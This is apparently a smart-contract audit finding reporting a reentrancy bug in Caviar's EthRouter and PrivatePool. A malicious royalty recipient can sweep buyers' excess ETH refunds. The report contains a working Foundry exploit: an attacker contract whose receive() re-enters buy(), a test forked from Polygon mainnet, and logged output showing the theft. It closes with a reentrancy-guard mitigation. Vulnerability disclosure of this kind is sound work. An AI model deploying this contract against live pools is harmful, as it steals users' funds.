## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- high quality report
- primary issue
- satisfactory
- selected for report
- edited-by-warden
- M-09

# [Malicious royalty recipient can steal excess eth from buy orders](https://github.com/code-423n4/2023-04-caviar-findings/issues/569) 

# Lines of code

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L268
https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L140-L143


# Vulnerability details

## Impact
Users that submit single or bulk Buy orders through `EthRouter.sol` can have their excess
eth stolen by a malicious royalty recipient

## Proof of Concept
### Introduction
The `buy(...)` function in `PrivatePool.sol` refunds excess ether back to `EthRouter.sol` and
then pays a royalty amount to a royalty recipient. The order is the following:

```solidity
// refund any excess ETH to the caller
if (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount);
```

```solidity
if (payRoyalties) {
    ...
else {
    recipient.safeTransferETH(royaltyFee);
}
```

This turns out to be dangerous since now `buy(...)` in `EthRouter.sol` can be reentered
from the fallback function of a royalty recipient. In the fallback function the attacker would
call `buy` in the `EthRouter.sol` with an empty `Buy[] buys calldata`, `deadline=0` and
`payRoyalties = false` which will skip the `for` loop in `buy(...)`, since `buys` is empty, and
would reach the following block of code:

```solidity
// refund any surplus ETH to the caller
if (address(this).balance > 0) {
    msg.sender.safeTransferETH(address(this).balance);
}
```

Since now `msg.sender` is the royalty recipient he would receive all the ether that is currently residing in `EthRouter.sol` while the original `buy(...)` triggered by the user hasn't yet finished.

Before supplying a PoC implementation in Foundry there are a few caveats to be noted.
Firstly, this issue can be more easily reproduced by assuming that the malicious royalty
recipient would come either from a single `Buy` order consisting of a single `tokenId` or multiple `Buy` orders where the `tokenId` with the malicious royalty recipient is the last `tokenId` in the array of the last `Buy` order. In the case of the `tokenId` associated with the malicious royalty recipient being positioned NOT in last place in the `tokenIds[]` array in the last `Buy` order we would have to write a `fallback` function that after collecting all the ether in `EthRouter.sol` somehow extracts information of how much ether would be needed to successfully complete the rest of the `buy(...)` invocations (that will be called on the rest of the `tokenIds[]`) and sends that ether back to `EthRouter.sol` so that the whole transaction doesn't revert due to `EthRouter.sol` being out of funds. In the presented PoC implementation it is assumed that `tokenIds` has a single token or the malicious royalty recipient is associated with the last `tokenId` in the last `Buy` if there are multiple `Buy` orders. In the case where `tokenId` is positioned not in last place a more sophisticated approach would be needed to steal the excess eth that involves inspecting the `EthRouter.buy(...)` while it resides in the transaction mempool and front-running a transaction that configures a fallback() function in the royalty recipient that would send the necessary amount of the stolen excess eth back to `EthRouter.sol` so that `buy(...) doesn't revert.

### PoC implementation

Place the following test in [2023-04-caviar/test](https://github.com/code-423n4/2023-04-caviar/tree/main/test).

Run `forge test --ffi --fork-url <polygon-mainnet-rpc-url> --fork-block-number 39900000 -m test_RoyaltyReceiverStealExcessEth -vv`.

The expected output in the terminal is:

```
  ============================================
   Before exploit
  ============================================
   | Attacker balance:            100.0 ETH
   | Victim balance:              100.0 ETH
   | Router balance:              0.0 ETH
   | Pool balance:                100.0 ETH
  ============================================
  
  ============================================
   After exploit
  ============================================
   | Attacker balance:            110.625 ETH
   | Victim balance:              64.375 ETH
   | Router balance:              0.0 ETH
   | Pool balance:                125.0 ETH
  ============================================
  
  ============================================
   Data
  ============================================
   | Amount ETH paid for NFT:     25.0 ETH
   | Royalty paid to receiver:    0.625 ETH
   | Stolen excess ETH:           10.0 ETH
  ============================================
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC721Royalty} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol";

import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

import "./Fixture.sol";

/**
 * @notice Needed functions interface of the ERC2981 NFT contract that we will use for this PoC.
 * @dev https://polygonscan.com/address/0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53#code
 */
interface IPixels {
    function creatorOf(uint256) external view returns (address);

    function setCreatorRedirect(address to) external;
}

/**
 * @title AttackerContract.
 * @notice The main logic for exploiting the vulnerability in PrivatePool.sol.
 */
contract MaliciousRoyaltyReceiver is Ownable, ERC721TokenReceiver {
    /// @notice The on-chain NFT collection contract that we will use for this PoC.
    ERC721Royalty nft;

    /// @notice the Caviar EthRouter contract.
    EthRouter router;

    /**
     * @param _nft The on-chain NFT collection contract that we will use for this PoC.
     * @param _router the Caviar EthRouter contract.
     */
    constructor(address _nft, address _router) {
        nft = ERC721Royalty(_nft);
        router = EthRouter(payable(_router));
    }

    /// @notice Used to perform cross contract re-entrancy and steal excess funds from victim users.
    receive() external payable {
        // This will steal all excess tokens that are currently transferred back to the pool.
        router.buy(new EthRouter.Buy[](0), 0, false);

        // Transfer the stolen amount to the owner/exploiter.
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success);
    }
}

contract RoyaltyReceiverStealExcessEthTest is Fixture {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721Royalty public nft;

    /// @notice The vulnerable Caviar private pool.
    PrivatePool public privatePool;

    /// @notice Merkle root is set to bytes32(0) to make setup simpler.
    bytes32 constant MERKLE_ROOT = bytes32(0);

    /// @notice The private pool has initial balance/reserve of 100 ETH (the base token is address(0)).
    uint128 constant VIRTUAL_BASE_TOKEN_RESERVES = 100e18;

    /// @notice The private pool has 5 NFTs, each one with a wight of 1e18 (the merkle root is bytes32(0)).
    uint128 constant VIRTUAL_NFT_RESERVES = 5e18;

    /// @notice The excess amount of ETH that the buyer/victim will send because they believe that it will be returned to them.
    uint256 constant EXCESS = 10e18;

    /// @notice The attacker contract.
    MaliciousRoyaltyReceiver public maliciousRoyaltyReceiver;

    /// @notice Common state variables.
    uint256 public tokenId;
    address public attacker;
    address public victim;

    function setUp() public {
        // Get a reference to an ERC2981 collection on polygon mainnet.
        nft = ERC721Royalty(0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53);

        // Pick an NFT token id that will be used to perform the attack.
        tokenId = 61039189399824080078548987048376199044334241070534370230028874880716994294049;

        _deployPrivatePool();

        // Deposit the NFT to the pool.
        _depositNft(tokenId);

        // Get need addresses.
        attacker = IPixels(address(nft)).creatorOf(tokenId);
        victim = vm.addr(0x1234);

        // Deploy the attacker contract.
        vm.startPrank(attacker);
        maliciousRoyaltyReceiver = new MaliciousRoyaltyReceiver(
            address(nft),
            address(ethRouter)
        );

        // Set the attacker contract as the royalty receiver for NFT#tokenId.
        // Note that creators can set the royalty receiver, but can also simply mint NFTs
        // from contracts that could have malicious fallback() and wouldn't need to use
        // setCreatorRedirect since the contract that minted the nft will alredy be royalty
        // recipient.
        IPixels(address(nft)).setCreatorRedirect(
            address(maliciousRoyaltyReceiver)
        );
        vm.stopPrank();

        // Deal ETH.
        _fundEth();
    }

    function test_RoyaltyReceiverStealExcessEth() public {
        _logState(" Before exploit");

        // Get needed data for buy and logs.
        (EthRouter.Buy[] memory buys, uint256 royalty) = _getBuysStructArray();

        // Victim balance before buy order.
        uint256 victimBalanceBefore = victim.balance;

        // Purchase amount = baseTokenAmout + royalty -> royalty already included in setup
        uint256 purchaseAmount = buys[0].baseTokenAmount;

        // Expected balance of victim after purchase.
        uint256 expectedVictimBalanceAfter = victimBalanceBefore -
            purchaseAmount;

        // Execute the buy from the victim account.
        vm.prank(victim);
        ethRouter.buy{value: buys[0].baseTokenAmount + EXCESS}(buys, 0, false);

        // Calculate the amount of stolen excess ETH.
        uint256 excessAmountLost = expectedVictimBalanceAfter - victim.balance;

        _logState(" After exploit");
        _logExtraData(buys[0].baseTokenAmount, royalty, excessAmountLost);

        // Test case that excess_amount_lost is not 0 and is equal to the excess in ethRouter.buy()
        assertEq(excessAmountLost, EXCESS, "Excess eth is not sent");
    }

    // ======================================= Helpers ======================================= //

    /**
     * @return buys The array expected from EthRouter.buy to execute the buy operation.
     * @return royalty The calculated royalty amount that will be paid to the receiver.
     */
    function _getBuysStructArray()
        internal
        view
        returns (EthRouter.Buy[] memory buys, uint256 royalty)
    {
        // Add nft id.
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        // Calculate total amount to be paid.
        (uint256 baseTokenAmount, uint256 fee1, uint256 fee2) = privatePool
            .buyQuote(tokenIds.length * 1e18);

        // NFT's sale price is excluding the fees.
        uint256 salePrice = baseTokenAmount - fee1 - fee2;

        // Retrieve the royalty that will be paid.
        (, royalty) = nft.royaltyInfo(tokenId, salePrice);

        // The total input ETH amount.
        baseTokenAmount = baseTokenAmount + royalty;

        // Return the needed argument struct array.
        buys = new EthRouter.Buy[](1);
        buys[0] = EthRouter.Buy({
            pool: payable(address(privatePool)),
            nft: address(nft),
            tokenIds: tokenIds,
            tokenWeights: new uint256[](0),
            proof: PrivatePool.MerkleMultiProof(
                new bytes32[](0),
                new bool[](0)
            ),
            baseTokenAmount: baseTokenAmount,
            isPublicPool: false
        });
    }

    /**
     * @notice Deploy and initialize an instance of the vulnerable private pool implementation.
     */
    function _deployPrivatePool() internal {
        // Deploy pool implementation.
        privatePool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );

        // Initialize pool instance.
        privatePool.initialize(
            address(0),
            address(nft),
            VIRTUAL_BASE_TOKEN_RESERVES,
            VIRTUAL_NFT_RESERVES,
            0,
            0,
            MERKLE_ROOT,
            false,
            true
        );
    }

    /**
     * @notice Transfer the NFT to the pool to simulate the private pool owner has deposited it.
     * @param _targetTokenId The specific NFT that will be used by the attacker to perform the exploit.
     */
    function _depositNft(uint256 _targetTokenId) internal {
        address owner = nft.ownerOf(tokenId);
        vm.prank(owner);
        nft.transferFrom(owner, address(privatePool), _targetTokenId);
        assertEq(nft.ownerOf(_targetTokenId), address(privatePool));
    }

    /**
     * @notice Funds ETH to the accounts that will need native tokens for this test case.
     */
    function _fundEth() internal {
        vm.deal(address(privatePool), VIRTUAL_BASE_TOKEN_RESERVES);
        vm.deal(attacker, 100e18);
        vm.deal(victim, 100e18);
    }

    /**
     * @notice Logs the current state to show the exploit status in the terminal.
     */
    function _logState(string memory state) internal view {
        console.log("");
        console.log("============================================");
        console.log(state);
        console.log("============================================");
        console.log(
            string.concat(
                " | Attacker balance:            ",
                string.concat(
                    Strings.toString(attacker.balance / 1e18),
                    ".",
                    Strings.toString((attacker.balance % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Victim balance:              ",
                string.concat(
                    Strings.toString(address(victim).balance / 1e18),
                    ".",
                    Strings.toString((address(victim).balance % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Router balance:              ",
                string.concat(
                    Strings.toString(address(ethRouter).balance / 1e18),
                    ".",
                    Strings.toString((address(ethRouter).balance % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Pool balance:                ",
                string.concat(
                    Strings.toString(address(privatePool).balance / 1e18),
                    ".",
                    Strings.toString(
                        (address(privatePool).balance % 1e18) / 1e15
                    )
                ),
                " ETH"
            )
        );
        console.log("============================================");
    }

    /**
     * @notice Logs the extra data to show the exploit status in the terminal.
     */
    function _logExtraData(
        uint256 amountETHPaid,
        uint256 royaltyPaid,
        uint256 excessAmountStolen
    ) internal view {
        console.log("");
        console.log("============================================");
        console.log(" Data");
        console.log("============================================");
        console.log(
            string.concat(
                " | Amount ETH paid for NFT:     ",
                string.concat(
                    Strings.toString((amountETHPaid - royaltyPaid) / 1e18),
                    ".",
                    Strings.toString(
                        ((amountETHPaid - royaltyPaid) % 1e18) / 1e15
                    )
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Royalty paid to receiver:    ",
                string.concat(
                    Strings.toString(royaltyPaid / 1e18),
                    ".",
                    Strings.toString((royaltyPaid % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Stolen excess ETH:           ",
                string.concat(
                    Strings.toString(excessAmountStolen / 1e18),
                    ".",
                    Strings.toString((excessAmountStolen % 1e18) / 1e15)
                ),
                " ETH"
            )
        );
        console.log("============================================");
    }
}
```

### Note on severity
A severity rating of "high" was chosen due to the following

1. Although the current state of the nft market mostly has adopted NFTs that have royalty payments directly to the creator, the authors of Caviar have acknowledged the ERC-2981 standard and it is assumed they are aware that `royaltyInfo` returns an arbitrary royalty recipient address.
 
2. The PoC implementation in this report uses an already existing NFT project  - Pixels1024 - deployed on the Polygon network that shows a use case where users are responsible for the creation of a given NFT from a collection and therefore the user-creator is assigned as a royalty recipient.

3. It is possible that future projects adopting ERC-2981 could have novel and complex interactions between who creates and who receives royalties in a given collection, therefore, extra caution should be a priority when handling `royaltyInfo` requests and the current implementation is shown to have а notable vulnerability.  

## Tools Used
1. Manual Inspection
2. Foundry
3. ERC-2981 specification - https://eips.ethereum.org/EIPS/eip-2981
4. 1024 Pixels NFT - [repo](https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol); [polygon](https://polygonscan.com/address/0x1024accd05fa01adbb74502dbddd8e430d610c53);

## Recommended Mitigation Steps
Rework `buy` in `EthRouter.sol` and `PrivatePool.sol`. Use reentrancy guard.